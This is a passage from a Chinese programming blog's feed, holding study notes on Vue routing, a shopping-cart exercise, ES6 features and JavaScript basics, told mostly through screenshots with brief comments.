class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.personal'&#125;"</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.message'&#125;"</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    |</span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-link</span> <span class="attr">:to</span>=<span class="string">"&#123;name:'nav.mine'&#125;"</span>&gt;</span>我的<span class="tag">&lt;/<span class="name">router-link</span>&gt;</span></span></span></span><br><span class="line">                    </span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Index=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Personal=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Message=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>资讯<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> Mine=&#123;</span></span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span>我的<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span></span><br><span class="line">            `</span><br><span class="line">        &#125;</span><br><span class="line"><span class="actionscript">        <span class="comment">// 安装路由插件</span></span></span><br><span class="line">        Vue.use(VueRouter);</span><br><span class="line"></span><br><span class="line"><span class="actionscript">        <span class="comment">//创建路由对象</span></span></span><br><span class="line"><span class="actionscript">        <span class="keyword">var</span> router = <span class="keyword">new</span> VueRouter(&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//配置路由</span></span></span><br><span class="line">            routes:[</span><br><span class="line"><span class="actionscript">                &#123;path:<span class="string">'/nav'</span>,</span></span><br><span class="line"><span class="actionscript">                name:<span class="string">'nav'</span>,</span></span><br><span class="line">                component:Nav,</span><br><span class="line"><span class="actionscript">                <span class="comment">//嵌套路由增加这个属性</span></span></span><br><span class="line">                children:[</span><br><span class="line"><span class="actionscript">                    <span class="comment">//配置我们的嵌套路由</span></span></span><br><span class="line"><span class="actionscript">                    <span class="comment">// &#123;path:'',redirect:'/nav/index'&#125;,</span></span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'index'</span>,name:<span class="string">'nav.index'</span>,component:Index&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'personal'</span>,name:<span class="string">'nav.personal'</span>,component:Personal&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'message'</span>,name:<span class="string">'nav.message'</span>,component:Message&#125;,</span></span><br><span class="line"><span class="actionscript">                    &#123;path:<span class="string">'mine'</span>,name:<span class="string">'nav.mine'</span>,component:Mine&#125;,</span></span><br><span class="line">                ]</span><br><span class="line">            </span><br><span class="line">            &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line"><span class="actionscript">        <span class="keyword">new</span> Vue(&#123;</span></span><br><span class="line"><span class="actionscript">            el:<span class="string">'#app'</span>,</span></span><br><span class="line">            router,</span><br><span class="line">            template:`</span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                    <span class="tag">&lt;<span class="name">router-view</span>&gt;</span><span class="tag">&lt;/<span class="name">router-view</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`,</span></span></span><br><span class="line">            data()&#123;</span><br><span class="line"><span class="actionscript">                <span class="keyword">return</span>&#123;</span></span><br><span class="line"><span class="actionscript">                    msg:<span class="string">''</span></span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            methods:&#123;</span><br><span class="line"></span><br><span class="line">            &#125;,</span><br><span class="line">            mounted()&#123;</span><br><span class="line"><span class="javascript">                router.beforeEach(<span class="function">(<span class="params">to,<span class="keyword">from</span>,next</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">console</span>.log(to);</span></span><br><span class="line"><span class="actionscript">                    <span class="keyword">if</span>(to.path==<span class="string">'/nav/index'</span>)&#123;</span></span><br><span class="line">                        next()</span><br><span class="line"><span class="actionscript">                    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="actionscript">                        setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span></span><br><span class="line">                            next()</span><br><span class="line">                        &#125;,2000)</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h1 id="购物车实战"><a href="#购物车实战" class="headerlink" title="购物车实战"></a>购物车实战</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220203636.png" alt="image-20211220203634994"></p><p><strong>添加商品到商品库</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220212034.png" alt="image-20211220212033010"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220212210.png" alt="image-20211220212209077"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211220212419453.png" alt="image-20211220212419453"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220212557.png" alt="image-20211220212556005"></p><p><strong>添加商品到购物车</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220212759.png" alt="image-20211220212757665"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220212916.png" alt="image-20211220212915186"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220220618.png" alt="image-20211220220617423"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220220838.png" alt="image-20211220220837484"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220221025.png" alt="image-20211220221024125"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220221119.png" alt="image-20211220221118279"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220221258.png" alt="image-20211220221256933"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220221546.png" alt="image-20211220221544883"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220222337.png" alt="image-20211220222335386"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220222433.png" alt="image-20211220222431697"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211220222510302.png" alt="image-20211220222510302"></p><p>冒号是v-bind的简写，可以随时监听</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220222950.png" alt="image-20211220222949023"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220223040.png" alt="image-20211220223039683"></p><p>增加这一行</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220223954.png" alt="image-20211220223934750"></p><p>监听</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220224356.png" alt="image-20211220224355264"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220224721.png" alt="image-20211220224719018"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220224853.png" alt="image-20211220224852398"></p><p>刷新数据还在，就不会消失</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211220224913.png" alt="image-20211220224912354"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Vue核心知识&quot;&gt;&lt;a href=&quot;#Vue核心知识&quot; class=&quot;headerlink&quot; title=&quot;Vue核心知识&quot;&gt;&lt;/a&gt;Vue核心知识&lt;/h1&gt;&lt;p&gt;Vue框架是以数据驱动和组件化开发为核心&lt;/p&gt;
&lt;h2 id=&quot;用vue做出自己的第一个网页&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="前端" scheme="https://blog.kaluna.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="Vue" scheme="https://blog.kaluna.top/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>ECMAScript6零基础到进阶实战</title>
    <link href="https://blog.kaluna.top/2021/12/19/ECMAScript6%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%88%B0%E8%BF%9B%E9%98%B6%E5%AE%9E%E6%88%98/"/>
    <id>https://blog.kaluna.top/2021/12/19/ECMAScript6%E9%9B%B6%E5%9F%BA%E7%A1%80%E5%88%B0%E8%BF%9B%E9%98%B6%E5%AE%9E%E6%88%98/</id>
    <published>2021-12-19T02:25:31.353Z</published>
    <updated>2021-12-19T11:35:40.488Z</updated>
    
    <content type="html"><![CDATA[<h1 id="项⽬环境搭建"><a href="#项⽬环境搭建" class="headerlink" title="项⽬环境搭建"></a>项⽬环境搭建</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219102957.png" alt="image-20211219102948822"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219103142.png" alt="image-20211219103141099"></p><p><strong>ctrl+1左边的点是打开vscode的终端快捷键</strong> package.json描述项目用的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219105534.png" alt="image-20211219105533128"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219110314.png" alt="image-20211219105924374"></p><p>package.json多出的东西，这个babel是为了兼容一些浏览器的</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219110042.png" alt="image-20211219110041501"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219110308.png" alt="image-20211219110306674"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219111232.png" alt="image-20211219111230884"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219113836.png" alt="image-20211219113834905"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219114016.png" alt="image-20211219114015833"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219114146.png" alt="image-20211219114145390"></p><p><strong>在src/index.js下修改一保存就可以在dist/index.js文件中看到，实时编译</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219114341.png" alt="image-20211219114336135"></p><h1 id="全新的声明及数据赋值⽅式"><a href="#全新的声明及数据赋值⽅式" class="headerlink" title="全新的声明及数据赋值⽅式"></a>全新的声明及数据赋值⽅式</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219115047.png" alt="image-20211219115046438"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219115338.png" alt="image-20211219115335197"></p><p>等价于</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219115355.png" alt="image-20211219115353977"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219120213.png" alt="image-20211219120212295"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219120323.png" alt="image-20211219120322575"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219122711.png" alt="image-20211219122710205"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219120312.png" alt="image-20211219120311513"></p><p><strong>Symbol</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219120421.png" alt="image-20211219120419756"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219121927.png" alt="image-20211219121926094"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219122053.png" alt="image-20211219122052844"></p><p><strong>解构赋值</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219123116.png" alt="image-20211219123114909"></p><p>other是一个数组</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219123046.png" alt="image-20211219123044849"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219124843.png" alt="image-20211219124842239"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219124925.png" alt="image-20211219124924550"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219125152.png" alt="image-20211219125151899"></p><h1 id="ES6新增的数据操作⽅法"><a href="#ES6新增的数据操作⽅法" class="headerlink" title="ES6新增的数据操作⽅法"></a>ES6新增的数据操作⽅法</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219125320.png" alt="image-20211219125318932"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219125741.png" alt="image-20211219125740477"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130203.png" alt="image-20211219130202765"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130356.png" alt="image-20211219130355623"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130455.png" alt="image-20211219130454487"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130553.png" alt="image-20211219130552619"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130745.png" alt="image-20211219130744102"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219130859.png" alt="image-20211219130858288"></p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211219131119206.png" alt="image-20211219131119206"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219131206.png" alt="image-20211219131205634"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219131740.png" alt="image-20211219131739227"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219131840.png" alt="image-20211219131839050"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219132023.png" alt="image-20211219132021785"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219132251.png" alt="image-20211219132249474"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219132558.png" alt="image-20211219132557636"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219133050.png" alt="image-20211219133049014"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219133255.png" alt="image-20211219133254666"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219133452.png" alt="image-20211219133451136"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219144010.png" alt="image-20211219144009236"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219144225.png" alt="image-20211219144223984"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219144544.png" alt="image-20211219144542826"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219144750.png" alt="image-20211219144748846"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219144921.png" alt="image-20211219144920301"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145106.png" alt="image-20211219145105954"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145227.png" alt="image-20211219145225511"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145350.png" alt="image-20211219145349670"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145528.png" alt="image-20211219145527060"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145840.png" alt="image-20211219145839607"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219145917.png" alt="image-20211219145916079"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219150025.png" alt="image-20211219150023992"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219150309.png" alt="image-20211219150307931"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219150435.png" alt="image-20211219150434274"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219150554.png" alt="image-20211219150553318"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219150738.png" alt="image-20211219150737769"></p><h1 id="Map-Set-Array-Object间的区别"><a href="#Map-Set-Array-Object间的区别" class="headerlink" title="Map Set Array Object间的区别"></a>Map Set Array Object间的区别</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219151039.png" alt="image-20211219151038314"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219151248.png" alt="image-20211219151247401"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219151412.png" alt="image-20211219151411428"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219152016.png" alt="image-20211219152014392"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219152215.png" alt="image-20211219152213961"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219152253.png" alt="image-20211219152251876"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219153043.png" alt="image-20211219152344438"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219153046.png" alt="image-20211219152440497"></p><h1 id="代理Proxy和反射reflect"><a href="#代理Proxy和反射reflect" class="headerlink" title="代理Proxy和反射reflect"></a>代理Proxy和反射reflect</h1><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211219152619655.png" alt="image-20211219152619655"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219153657.png" alt="image-20211219153656389"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219154055.png" alt="image-20211219154054521"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219154244.png" alt="image-20211219154243362"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219154555.png" alt="image-20211219154554030"></p><h1 id="函数的扩展、类的概念及模块化"><a href="#函数的扩展、类的概念及模块化" class="headerlink" title="函数的扩展、类的概念及模块化"></a>函数的扩展、类的概念及模块化</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162352.png" alt="image-20211219162350725"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162536.png" alt="image-20211219162532860"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162705.png" alt="image-20211219162703643"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162739.png" alt="image-20211219162735958"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162804.png" alt="image-20211219162803297"></p><p><strong>扩展运算符</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219162852.png" alt="image-20211219162851039"></p><p><strong>箭头函数</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219163038.png" alt="image-20211219163037026"></p><p><strong>注意：这里的this是指向window</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219163329.png" alt="image-20211219163328744"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219163852.png" alt="image-20211219163851089"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219165039.png" alt="image-20211219165038367"></p><p>下面这种也ok</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219165308.png" alt="image-20211219165306730"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219163945.png" alt="image-20211219163944710"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219165539.png" alt="image-20211219165538813"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219165717.png" alt="image-20211219165715555"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219165825.png" alt="image-20211219165824319"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219170205.png" alt="image-20211219170204633"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219170321.png" alt="image-20211219170320072"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219170530.png" alt="image-20211219170529156"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219170707.png" alt="image-20211219170705621"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219170832.png" alt="image-20211219170831573"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219172422.png" alt="image-20211219172421763"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219172511.png" alt="image-20211219172509793"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219172823.png" alt="image-20211219172821047"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219172923.png" alt="image-20211219172922010"></p><p>模块化开发export import</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173114.png" alt="image-20211219173112712"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173245.png" alt="image-20211219173244282"></p><p><strong>记得添加type=”module”，不然会报错</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173423.png" alt="image-20211219173421191"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173533.png" alt="image-20211219173532228"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173716.png" alt="image-20211219173715274"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219173824.png" alt="image-20211219173823638"></p><p>然后在修改import语句</p><p><img src="C:/Users/86158/AppData/Roaming/Typora/typora-user-images/image-20211219173905196.png" alt="image-20211219173905196"></p><h1 id="深⼊解析JavaScript中的异步编程"><a href="#深⼊解析JavaScript中的异步编程" class="headerlink" title="深⼊解析JavaScript中的异步编程"></a>深⼊解析JavaScript中的异步编程</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219174032.png" alt="image-20211219174031022"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219174136.png" alt="image-20211219174135579"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219174403.png" alt="image-20211219174401971"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219174850.png" alt="image-20211219174849085"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219175125.png" alt="image-20211219175124402"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219175228.png" alt="image-20211219175226992"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219175312.png" alt="image-20211219175311117"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219175615.png" alt="image-20211219175614341"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219185058.png" alt="image-20211219185057040"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219185220.png" alt="image-20211219185218591"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219185324.png" alt="image-20211219185323197"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219185819.png" alt="image-20211219185817862"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219190607.png" alt="image-20211219185831275"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219190015.png" alt="image-20211219190012000"></p><p><strong>promise 中不仅可以存放异步的代码还可以存放同步的代码</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219190558.png" alt="image-20211219190556970"></p><p><strong>async是为了解决太多的.then操作</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219190811.png" alt="image-20211219190810177"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219191054.png" alt="image-20211219191053189"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219191126.png" alt="image-20211219191125382"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219191321.png" alt="image-20211219191319732"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219191935.png" alt="image-20211219191933821"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211219192037.png" alt="image-20211219192036453"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;项⽬环境搭建&quot;&gt;&lt;a href=&quot;#项⽬环境搭建&quot; class=&quot;headerlink&quot; title=&quot;项⽬环境搭建&quot;&gt;&lt;/a&gt;项⽬环境搭建&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://gitee.com/YuerryHUAHUA/figure/raw/ma
      
    
    </summary>
    
    
      <category term="前端" scheme="https://blog.kaluna.top/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
      <category term="ECMAScript6" scheme="https://blog.kaluna.top/tags/ECMAScript6/"/>
    
  </entry>
  
  <entry>
    <title>Javascript基础到实战</title>
    <link href="https://blog.kaluna.top/2021/12/18/Javascript%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/"/>
    <id>https://blog.kaluna.top/2021/12/18/Javascript%E5%9F%BA%E7%A1%80%E5%88%B0%E5%AE%9E%E6%88%98/</id>
    <published>2021-12-18T01:14:16.617Z</published>
    <updated>2021-12-19T02:24:16.628Z</updated>
    
    <content type="html"><![CDATA[<h1 id="初识Javascript"><a href="#初识Javascript" class="headerlink" title="初识Javascript"></a>初识Javascript</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218092902.png" alt="image-20211218092900681"></p><p>等价于</p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218092926.png" alt="image-20211218092925232"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218094752.png" alt="image-20211218094751169"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218100334.png" alt="image-20211218100330968"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218100420.png" alt="image-20211218100418752"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218101026.png" alt="image-20211218101024779"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218101244.png" alt="image-20211218101243450"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218101413.png" alt="image-20211218101412778"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218103530.png" alt="image-20211218102629980"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218103605.png" alt="image-20211218103603777"></p><p><strong>构造函数的第一个字母要大写</strong></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218105728.png" alt="image-20211218105726866"></p><h1 id="Javascript对象"><a href="#Javascript对象" class="headerlink" title="Javascript对象"></a>Javascript对象</h1><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218110124.png" alt="image-20211218110122754"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218111113.png" alt="image-20211218111112075"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218111843.png" alt="image-20211218111841798"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218111917.png" alt="image-20211218111916002"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218111943.png" alt="image-20211218111942136"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218112056.png" alt="image-20211218112055053"></p><p><img src="https://gitee.com/YuerryHUAHUA/figure/raw/master/img/20211218112211.png" alt="image-20211218112209421"></p><p><img 